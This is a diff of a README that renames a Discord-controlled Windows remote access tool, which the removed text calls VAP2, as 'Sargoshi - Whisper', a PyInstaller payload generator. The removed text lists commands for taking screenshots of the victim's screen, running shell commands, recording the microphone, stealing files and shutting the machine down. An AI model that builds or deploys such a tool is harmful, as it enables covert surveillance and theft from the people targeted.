@@ -1,37 +1,32 @@
-# 💨 vapoursssmalwarewindows
+# 🌙 Sargoshi - Whisper
 
-**Version:** vap~2  
-**Codename:** VAP2  
-**Platform:** Windows  
-**Author:** VAPOURSSS
+**Version 2.0**  
+**Author:** [@haider1928](https://github.com/haider1928)
 
 ---
 
-## 🧠 Overview
+## ✨ Introduction
 
-`VAP-WINDOWS-2.0` (VAP2) is a Discord-based remote administration tool (RAT) built for ethical testing, educational use, and secure environments. It offers various surveillance and command-execution features through Discord bot commands — all done remotely.
-
-> ⚠️ **Disclaimer**: This tool is strictly for **educational purposes** and **authorized use** only. Misuse can be illegal. The author assumes **no responsibility** for misuse or damages.
+**Sargoshi - Whisper** is a sophisticated payload generator that leverages **Python, PyInstaller, and the Discord API** to create **custom payload executables**. The project features an interactive setup process and ensures all sensitive information is configurable via an environment file (`engine/.env`).
 
 ---
 
-## 📜 VAP2 HELP MENU
+## ⚙️ Prerequisites
 
-| **Command**                        | **Usage Description**                                                                 |
-|-----------------------------------|----------------------------------------------------------------------------------------|
-| `screenshot`                      | Takes a screenshot of the victim’s screen and sends it back.                          |
-| `run <command>`                   | Executes Windows CMD commands remotely.                                               |
-| `sysinfo`                         | Returns a text file with system information (IP, specs, OS, etc.).                    |
-| `shutdown`                        | Shuts down the victim’s machine.                                                      |
-| `capture-audio <duration>`        | Records audio from the victim's microphone for `<duration>` seconds and returns `.avi`.|
-| `grab-file <file-path>`           | Retrieves a file from the victim’s system.                                            |
-| `grab-folder <folder-path>`      | Returns all files from the specified folder.                                          |
-| `help-tool`                       | Displays this help menu.                                                              |
+Before proceeding, ensure the following:
+
+✅ **Python** (version 3.9 or above)  
+✅ **pip** installed  
+✅ **Discord Bot** set up in the [Discord Developer Portal](https://discord.com/developers/applications)  
+✅ **Bot added to your server** with the proper permissions  
+✅ **Server ID** of the server where the bot is added
 
 ---
 
-## 🛠 Setup
+## 🔧 Setup Steps
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/haider1928/vap-windows.git
+1️⃣ **Clone the repository**:
+
+```bash
+git clone https://github.com/haider1928/sargoshi-whisper.git
+cd sargoshi-whisper
